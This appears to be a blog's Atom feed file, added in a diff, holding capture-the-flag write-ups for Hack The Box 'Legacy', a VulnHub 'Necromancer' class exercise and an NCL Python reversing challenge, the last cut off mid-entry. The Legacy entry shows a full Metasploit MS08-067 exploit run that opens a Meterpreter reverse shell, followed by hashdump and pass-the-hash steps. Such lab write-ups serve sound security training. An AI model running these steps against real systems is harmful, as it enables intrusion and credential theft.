@@ -1,0 +1,1374 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-08-08T17:59:30-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Hi</title><subtitle>A very Mehh Networking and Cybersecurity online notebook and blog.
+</subtitle><author><name>Zack Jones</name></author><entry><title type="html">Legacy HTB Writeup</title><link href="http://localhost:4000/infosec/2020/05/15/Legacy-HTB-Writeup.html" rel="alternate" type="text/html" title="Legacy HTB Writeup" /><published>2020-05-15T18:00:00-04:00</published><updated>2020-05-15T18:00:00-04:00</updated><id>http://localhost:4000/infosec/2020/05/15/Legacy-HTB-Writeup</id><content type="html" xml:base="http://localhost:4000/infosec/2020/05/15/Legacy-HTB-Writeup.html">&lt;p&gt;The Legacy HTB machine was one of the first HTB machines I ever broke into. It’s a retired box that is pretty basic, leaning towards understanding basic methodology and how to make use of CVEs that you find on a box. It’s a good start for practicing for the OSCP.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Legacy/Website_shot.png&quot; alt=&quot;Website Screenshot&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;If this writeup isn’t enough, HTB does include &lt;a href=&quot;https://www.hackthebox.eu/home/machines/profile/2&quot;&gt;a writeup&lt;/a&gt; on the site. There are also plenty of videos online how to do this box as well.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Okay let’s get into it&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;scanning-the-machine&quot;&gt;Scanning the machine&lt;/h3&gt;
+&lt;p&gt;So from HTB we already know the IP address is &lt;code&gt;10.10.10.4&lt;/code&gt; so as long as our openvpn connection is setup we should be able to start banging on it.&lt;/p&gt;
+
+&lt;p&gt;I’m going to scan this in a few different ways. First let’s do a basic nmap.&lt;/p&gt;
+
+&lt;h4 id=&quot;basic-nmap&quot;&gt;Basic nmap&lt;/h4&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap 10.10.10.4
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;or in case it has trouble&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -Pn 10.10.10.4
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Legacy/basic_nmap.png&quot; alt=&quot;Basic nmap scan&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This scan will give us some basic information. It’s good to do this scan first to see if there are any ports you can start to enumearte while waiting for larger scans.&lt;br /&gt;
+From this we can guess it might have something to do with SMB. How?&lt;br /&gt;
+&lt;strong&gt;SMB&lt;/strong&gt;&lt;/p&gt;
+&lt;ul class=&quot;task-list&quot;&gt;
+  &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; checked=&quot;checked&quot; /&gt;Has older SMB port 139. SMB used to run on 139 on top of netbios&lt;/li&gt;
+  &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; checked=&quot;checked&quot; /&gt;Has newer SMB port 445. After Windows 2000, SMB was moved to this port.&lt;br /&gt;
+It’s not enough for full confidence but it’s enough to start to see where we might be going with this.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Let’s run a couple bigger scans.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; The next two scans can be run back to back but if you run the nmapAutomator.sh script, it includes the nmap scan I’m about to show you.&lt;/p&gt;
+
+&lt;h4 id=&quot;big-nmap-scan&quot;&gt;“Big nmap” scan&lt;/h4&gt;
+&lt;p&gt;I personally call this the big nmap. It’s a scan that will scan all ports, and run anything it can against it.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -T4 -A -p- 10.10.10.4
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;I kept &lt;code&gt;-Pn&lt;/code&gt; just because.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Legacy/big_nmap.png&quot; alt=&quot;big nmap &quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Before we run the next scan, lets go ahead and see what we can find from this.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Still looks like SMB&lt;/li&gt;
+  &lt;li&gt;SMB Security looks weak - &lt;code&gt;message_signing: disabled&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Evidence that it is an older Windows machine, most likley XP.&lt;/li&gt;
+  &lt;li&gt;Computer name is ‘Legacy’&lt;/li&gt;
+  &lt;li&gt;Workgroup is ‘HTB’&lt;/li&gt;
+  &lt;li&gt;Maybe possible to enumerate netbios&lt;/li&gt;
+  &lt;li&gt;Has directory services enabled&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Okay let’s run the nmapAutomator.sh scan.&lt;/p&gt;
+
+&lt;h4 id=&quot;nmapautomatorsh&quot;&gt;nmapAutomator.sh&lt;/h4&gt;
+&lt;p&gt;Before we run this scan, let’s talk about it a bit.&lt;br /&gt;
+nmapAutomator.sh is a bash script written by Github users &lt;strong&gt;21y4d, austinsonger, and Knowledge_Wisdom_Understanding&lt;/strong&gt; and can be found on &lt;a href=&quot;https://github.com/21y4d/nmapAutomator&quot;&gt;Github here.&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;It will run a handful of scans at the same time for you including:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;sslscan&lt;/li&gt;
+  &lt;li&gt;nikto&lt;/li&gt;
+  &lt;li&gt;wpscan&lt;/li&gt;
+  &lt;li&gt;smbmap&lt;/li&gt;
+  &lt;li&gt;etc.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;So let’s run a full scan and see how it goes.&lt;br /&gt;
+The scan is quite lengthy so I won’t be posting a screenshot of the whole thing, but if you want to see the whole scan, you can watch it here. &lt;a href=&quot;https://asciinema.org/a/MnWeg5pekvWqu44AWeiSqOO9v&quot;&gt;&lt;img src=&quot;https://asciinema.org/a/MnWeg5pekvWqu44AWeiSqOO9v.svg&quot; alt=&quot;asciicast&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;This scan basically just confirmed what we found from previous scans. But it did give some paticularly interesting information on the SMB situation.
+&lt;img src=&quot;/assets/img/Walkthroughs/Legacy/nmapauto_vulns.png&quot; alt=&quot;SMB Vulnerabilities&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So now we know that this machine has two CVEs marked as vulnerable.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;CVE-2008-4250&lt;/li&gt;
+  &lt;li&gt;CVE-2017-0143&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;At this point we could probably start poking at these CVEs but let’s try to dig in a bit further before attacking the machine.&lt;/p&gt;
+
+&lt;h4 id=&quot;netbios-enumeration&quot;&gt;Netbios enumeration&lt;/h4&gt;
+
+&lt;h4 id=&quot;smb-enumeration&quot;&gt;SMB enumeration&lt;/h4&gt;
+&lt;h4 id=&quot;cve-2008-4250&quot;&gt;CVE-2008-4250&lt;/h4&gt;
+&lt;h4 id=&quot;cve-2017-0143&quot;&gt;CVE-2017-0143&lt;/h4&gt;
+&lt;h4 id=&quot;exploitation-and-gaining-access&quot;&gt;Exploitation and Gaining Access&lt;/h4&gt;
+
+&lt;p&gt;Netbios&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nbtscan -v 10.10.10.4
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Doing NBT name scan for addresses from 10.10.10.4
+
+NetBIOS Name Table for Host 10.10.10.4:
+
+Name             Service          Type             
+----------------------------------------
+LEGACY           &amp;lt;00&amp;gt;             UNIQUE
+HTB              &amp;lt;00&amp;gt;              GROUP
+LEGACY           &amp;lt;20&amp;gt;             UNIQUE
+HTB              &amp;lt;1e&amp;gt;              GROUP
+HTB              &amp;lt;1d&amp;gt;             UNIQUE
+__MSBROWSE__  &amp;lt;01&amp;gt;              GROUP
+
+Adapter address: 00:50:56:b9:55:3f
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Windows XP
+name: legacy
+smb defaults? - message signing disabled
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;smb&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient -L \\10.10.10.4\\
+nmap -p 445 --script smb-os-discovery 10.10.10.4 (this happens with the nmap you ran before but could be used to check it)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;metasploit scanning enum&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;search for smb enum
+use auxiliary/scanner/smb/smb_version
+
+msf5 &amp;gt; use auxiliary/scanner/smb/smb_version
+msf5 auxiliary(scanner/smb/smb_version) &amp;gt; options
+
+Module options (auxiliary/scanner/smb/smb_version):
+
+Name       Current Setting  Required  Description
+----       ---------------  --------  -----------
+RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&amp;lt;path&amp;gt;'
+SMBDomain  .                no        The Windows domain to use for authentication
+SMBPass                     no        The password for the specified username
+SMBUser                     no        The username to authenticate as
+THREADS    1                yes       The number of concurrent threads (max one per host)
+
+msf5 auxiliary(scanner/smb/smb_version) &amp;gt; set RHOSTS
+[-] Unknown variable
+Usage: set [option] [value]
+
+Set the given option to value.  If value is omitted, print the current value.
+If both are omitted, print options that are currently set.
+
+If run from a module context, this will set the value in the module's
+datastore.  Use -g to operate on the global datastore.
+
+If setting a PAYLOAD, this command can take an index from `show payloads'.
+
+msf5 auxiliary(scanner/smb/smb_version) &amp;gt; set RHOSTS 10.10.10.4
+RHOSTS =&amp;gt; 10.10.10.4
+msf5 auxiliary(scanner/smb/smb_version) &amp;gt; run
+
+[+] 10.10.10.4:445        - Host is running Windows XP SP3 (language:English) (name:LEGACY) (workgroup:HTB ) (signatures:optional)
+[*] 10.10.10.4:445        - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Find version and look for exploits online.&lt;/p&gt;
+
+&lt;p&gt;Doesn’t find much. Hope that Old OS just have vulns&lt;/p&gt;
+
+&lt;p&gt;Search google for exploits.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ms08-067 - SMB Windows XP service pack 3 vuln. 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 auxiliary(scanner/smb/smb_version) &amp;gt; use exploit/windows/smb/ms08_067_netapi
+msf5 exploit(windows/smb/ms08_067_netapi) &amp;gt; options
+
+Module options (exploit/windows/smb/ms08_067_netapi):
+
+Name     Current Setting  Required  Description
+----     ---------------  --------  -----------
+RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&amp;lt;path&amp;gt;'
+RPORT    445              yes       The SMB service port (TCP)
+SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+
+Exploit target:
+
+Id  Name
+--  ----
+0   Automatic Targeting
+
+msf5 exploit(windows/smb/ms08_067_netapi) &amp;gt; rhosts 10.10.10.4
+[-] Unknown command: rhosts.
+msf5 exploit(windows/smb/ms08_067_netapi) &amp;gt; set rhosts 10.10.10.4
+rhosts =&amp;gt; 10.10.10.4
+msf5 exploit(windows/smb/ms08_067_netapi) &amp;gt; run
+
+[*] Started reverse TCP handler on 10.10.14.17:4444 
+[*] 10.10.10.4:445 - Automatically detecting the target...
+[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
+[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
+[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
+[*] Sending stage (176195 bytes) to 10.10.10.4
+[*] Meterpreter session 1 opened (10.10.14.17:4444 -&amp;gt; 10.10.10.4:1031) at 2020-05-11 23:01:23 -0400
+
+meterpreter &amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;You can also use the PoC script and modify it to work and use that manually.&lt;/p&gt;
+
+&lt;h3 id=&quot;post-exploit&quot;&gt;post exploit&lt;/h3&gt;
+
+&lt;p&gt;check user. and system info (these are meterpreter commands)&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;getuid
+then
+sysinfo
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;you can do a hashdump to get the usernames and passwords for cracking later&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hashdump
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;you can do pass the hash stuff as well.&lt;/p&gt;
+
+&lt;p&gt;you can navigate the machine with&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;shell
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Get the user and root.txt files&lt;/p&gt;
+
+&lt;p&gt;to cat out a file you use&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;type filename.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Zack Jones</name></author><category term="InfoSec" /><summary type="html">The Legacy HTB machine was one of the first HTB machines I ever broke into. It’s a retired box that is pretty basic, leaning towards understanding basic methodology and how to make use of CVEs that you find on a box. It’s a good start for practicing for the OSCP.</summary></entry><entry><title type="html">Necromancer VulnHub Class Exercise</title><link href="http://localhost:4000/infosec/2019/02/02/Necromancer-VulnHub-Writeup.html" rel="alternate" type="text/html" title="Necromancer VulnHub Class Exercise" /><published>2019-02-02T08:16:00-05:00</published><updated>2019-02-02T08:16:00-05:00</updated><id>http://localhost:4000/infosec/2019/02/02/Necromancer-VulnHub-Writeup</id><content type="html" xml:base="http://localhost:4000/infosec/2019/02/02/Necromancer-VulnHub-Writeup.html">&lt;h2 id=&quot;necromancer-notes&quot;&gt;Necromancer Notes&lt;/h2&gt;
+&lt;h5 id=&quot;made-for-intro-for-cyber-security-class-taught-spring-2019&quot;&gt;Made for Intro for Cyber Security Class taught Spring 2019.&lt;/h5&gt;
+
+&lt;p&gt;Necromancer is a CTF that can be downloaded and ran on a virtual environment such as VirtualBox, VMWare, Hyper-V.  &lt;a href=&quot;https://www.vulnhub.com/entry/the-necromancer-1,154/&quot;&gt;https://www.vulnhub.com/entry/the-necromancer-1,154/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;To assist with our walk through of this CTF, we will be using this reference video - &lt;a href=&quot;https://www.youtube.com/watch?v=ULRZcsjkvSA&quot;&gt;JackkTutorials - Necromancer&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;The video does not complete the CTF but we will follow through the steps to complete as much as he completes in the video. Try to follow along with his steps.&lt;/p&gt;
+
+&lt;p&gt;Following the hacking methodology as discussed, you will want to start with some recon.&lt;/p&gt;
+
+&lt;h3 id=&quot;passive-recon&quot;&gt;Passive Recon&lt;/h3&gt;
+&lt;p&gt;Jackk looks at the website for clues, looks at the virtual machine’s screen for information. Also gathers information about his machine and the network. Finds all IP addresses on the network in order to find the machine. Eliminates other machines one by one.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Website information&lt;/strong&gt;
+&lt;img src=&quot;/assets/img/Walkthroughs/Necromancer/Website-Recon.png&quot; alt=&quot;Website Recon&quot; /&gt;&lt;br /&gt;
+&lt;strong&gt;Machine DHCP&lt;/strong&gt;&lt;br /&gt;
+&lt;img src=&quot;/assets/img/Walkthroughs/Necromancer/Machine_DHCP_Screen.png&quot; alt=&quot;Machine DHCP&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;To eliminate the IP addresses&lt;/strong&gt;&lt;br /&gt;
+He uses route to find gateway, looks in log files to find DHCP, looks in ifconfig for himself. Last IP is the machine.&lt;/p&gt;
+
+&lt;h4 id=&quot;commands-used&quot;&gt;Commands used&lt;/h4&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ifconfig  //checking Linux interface information. Similar to Windows ipconfig
+route -n  //checking what your machine's gateway. 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;strong&gt;Using Route to find the gateway&lt;/strong&gt;&lt;br /&gt;
+&lt;img src=&quot;/assets/img/Walkthroughs/Necromancer/route.png&quot; alt=&quot;route&quot; /&gt;&lt;br /&gt;
+&lt;strong&gt;Using ifconfig to find your own IP&lt;/strong&gt;&lt;br /&gt;
+&lt;img src=&quot;/assets/img/Walkthroughs/Necromancer/ifconfig.png&quot; alt=&quot;ifconfig&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;active-recon&quot;&gt;Active Recon&lt;/h3&gt;
+&lt;p&gt;First &lt;code&gt;nmap&lt;/code&gt; the network to get an idea of what machines are on the network and help find the machine you’re looking to hack. Then nmap scan on the IP address of the victim machine. Look for ports that could be vulnerable.&lt;/p&gt;
+
+&lt;h4 id=&quot;scanning-whole-network-for-all-machines-that-are-up&quot;&gt;Scanning whole network for all machines that are up&lt;/h4&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -sP 192.168.1.*
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Note the use of a wildcard in the IP to cover all possible addresses in the 192.168.1 network.&lt;br /&gt;
+The -sP scan means just pinging machines. Note: Some machines may not respond to ICMP packets depending on how the machine is setup.&lt;/p&gt;
+
+&lt;h4 id=&quot;scanning-a-single-machine-for-tcp-ports-that-are-open-simple&quot;&gt;Scanning a single machine for tcp ports that are open (simple)&lt;/h4&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap 192.168.1.22
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ports that are vulnerable are things like http, https, ftp, telnet, smb, and plenty others. Other ports are important as well. Getting an idea of what the machine is running is key to understanding what you are working with.&lt;/p&gt;
+
+&lt;p&gt;He fails to find a port that is open using a typical TCP nmap scan. He decided to run another scan, but tells nmap to check for UDP instead of TCP. With UDP you want to limit the ports.&lt;/p&gt;
+
+&lt;h4 id=&quot;udp-nmap-scan&quot;&gt;UDP nmap Scan&lt;/h4&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -sU 1-1000 192.168.1.22   //does a udp scan on ports 1 through 1000
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;udp-port-found&quot;&gt;UDP Port found.&lt;/h4&gt;
+&lt;p&gt;Scans find a port open. He finds a UDP port that is open called doom on port 666.&lt;/p&gt;
+
+&lt;p&gt;To connect to a computer you must have a socket. And to have a socket all you need is the IP address and an open port that is willing to communicate.&lt;/p&gt;
+
+&lt;p&gt;With UDP sometimes you can just simply connect to it with a tool called netcat. From there you will see the raw data being transferred. If it’s encrypted you will not be able to read it. To try and connect to this:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc -u 192.168.110.22 666
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;It successfully connects to the port and the necromancer machine then sends plaintext data to him that says &lt;code&gt;Time is running out. You gasp for air!&quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;To see if anything else is happening on the machine while the UDP port is connected. You can open wireshark and let it run for a bit to find that the Necromancer machine actually attempts to connect to his machine on TCP port 4444. Note: The TCP port seems to only want to connect once you’ve connected to the UDP port.&lt;/p&gt;
+
+&lt;p&gt;You can also listen for connections the same way we did before for TCP connections. But in this case it’s listening for any machine on the port. The command looks like this.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc -lvp 4444  /// listens for any incoming connections on port 4444
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;It connects successfully and it spits out a string of random characters. This was encoded and needed to be decoded.&lt;/p&gt;
+
+&lt;p&gt;The decoded message left a clue that said &lt;code&gt;Chant the string of flag1 -u666&lt;/code&gt; it also gives him the first flag which is jumbled letters and numbers.&lt;/p&gt;
+
+&lt;p&gt;When you find jumbled letters and numbers, it may be good practice to test to see if it is encoded or encrypted and possibly useful information.&lt;/p&gt;
+
+&lt;h3 id=&quot;to-check-a-string-for-encoding-or-hashingencryption&quot;&gt;To check a string for encoding or hashing/encryption&lt;/h3&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hashid [the string you are testing]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Hashid is a tool that checks for signatures or clues of certain hashes. it isn’t always accurate but it can help when you’re not sure.&lt;/p&gt;
+
+&lt;p&gt;HashID shows that the string is an MD5 hash and he uses an online MD5 hash decrypt tool. The flag decrypted ends up being &lt;code&gt;opensesame&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Now he connects to UDP port 666 while sending &lt;code&gt;opensesame&lt;/code&gt; to the other machine using echo.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo opensesame | nc -u 192.168.100.140 666
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;By using echo and piping it into the netcat connection, we send it the string &lt;code&gt;opensesame&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Once he makes this new connection it gives him another clue along with a second flag. This clue lets him know that 666 is closed and “A formation that looks like 80”&lt;/p&gt;
+
+&lt;p&gt;Port 80 is generally used for HTTP. HTTPS, which is encrypted is usually on 443. If a computer has port 80 open, you can go to it’s ip address on your machine to look at whatever webpage(s) it is hosting.&lt;/p&gt;
+
+&lt;p&gt;He nmap scans the machine again to make sure port 80 is open.&lt;/p&gt;
+
+&lt;p&gt;He goes to the website.&lt;/p&gt;
+
+&lt;p&gt;The first thing he does to recon the site is to look at the source code to see if there are more clues or to see if it is wordpress, etc.&lt;/p&gt;
+
+&lt;p&gt;He notices that the only thing on the page that may have something worth looking into is the picture so he checks the picture for stenography.&lt;/p&gt;
+
+&lt;p&gt;Stego isn’t typically used in the real world, but is a good skill to understand and know how to work with as a Cyber Security professional.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;unzip pileoffeathers.jpg   //attempt to unzip a file to find other files within it. Files can be hidden inside of other files. 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Once he unzips the picture, a pileoffeathers.txt is then pulled from the image and saved onto his machine.&lt;/p&gt;
+
+&lt;p&gt;The text file has another Base64 hash inside of it. It decodes to give another flag and a clue to his next step “/amagicbridgeappearsatthechasm” and the flag decodes to a number.&lt;/p&gt;
+
+&lt;p&gt;He visits the directory from the hidden file to find another page.&lt;/p&gt;
+
+&lt;h4 id=&quot;video-ends-here&quot;&gt;Video ends here.&lt;/h4&gt;
+
+&lt;p&gt;We can assume that the &lt;code&gt;/amagicbridgeappearsatthechasm&lt;/code&gt; is possibly a directory. Try going to the site by typing the host’s IP address and then going to the url. From there use your Web pentesting notes to search through possible directories, check pages that are hidden from Google’s web crawlers, test to see if it’s running off of Wordpress, etc. Take screenshots of your findings.&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="InfoSec" /><summary type="html">Necromancer Notes Made for Intro for Cyber Security Class taught Spring 2019.</summary></entry><entry><title type="html">NCL Gym Exploitation ‘Python 2’</title><link href="http://localhost:4000/infosec/2018/04/02/NCL-Gym-Exploitation-PYTHON2.html" rel="alternate" type="text/html" title="NCL Gym Exploitation ‘Python 2’" /><published>2018-04-02T21:13:00-04:00</published><updated>2018-04-02T21:13:00-04:00</updated><id>http://localhost:4000/infosec/2018/04/02/NCL-Gym-Exploitation-PYTHON2</id><content type="html" xml:base="http://localhost:4000/infosec/2018/04/02/NCL-Gym-Exploitation-PYTHON2.html">&lt;p&gt;So this challenge at first glance was intimidating. There was a bit more going on in this one. But always, always, always - code looks scarier than it actually is. But before we get into the code. The download was a .pyc file.&lt;/p&gt;
+
+&lt;p&gt;Wut.&lt;/p&gt;
+
+&lt;p&gt;I’ve made a few python scripts before and I’ve never seen pyc. Google time.&lt;/p&gt;
+
+&lt;p&gt;Oh. Well. This is usually where I stop. I usually skip compiled stuff, and a pyc is a compiled python program.&lt;/p&gt;
+
+&lt;p&gt;Luckily there are tools to undo the ugly compiled mess. I’m on a Mac so I used brew to install uncompyle6. Again I googled for a bit.&lt;/p&gt;
+
+&lt;p&gt;uncompyle6 is simple. Put in a pyc and out comes code.&lt;/p&gt;
+
+&lt;p&gt;This is what my terminal spits out&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ uncompyle6 PYTHON2.pyc
+# uncompyle6 version 3.1.1
+# Python bytecode 2.7 (62211)
+# Decompiled from: Python 2.7.10 (default, Jul 15 2017, 17:16:57)
+# [GCC 4.2.1 Compatible Apple LLVM 9.0.0 (clang-900.0.31)]
+# Embedded file name: NCL-2015-Python2.py
+# Compiled at: 2015-11-12 17:43:01
+import sys
+
+def main():
+    if len(sys.argv) != 2:
+        print 'Invalid args'
+        return
+    password = sys.argv[1]
+    counter = 0
+    vals = list('tfzbwlyzljylawhzzdvyk')
+    if len(password) != len(vals):
+        print 'incorrect'
+        return
+    while counter &amp;lt; len(password):
+        x = ord(password[counter]) + 7
+        if x &amp;gt; ord('z'):
+            x -= 26
+        if chr(x) != vals[counter]:
+            print 'incorrect'
+            return
+        counter += 1
+
+    print 'correct'
+
+
+if __name__ == '__main__':
+    main()
+# okay decompiling PYTHON2.pyc
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
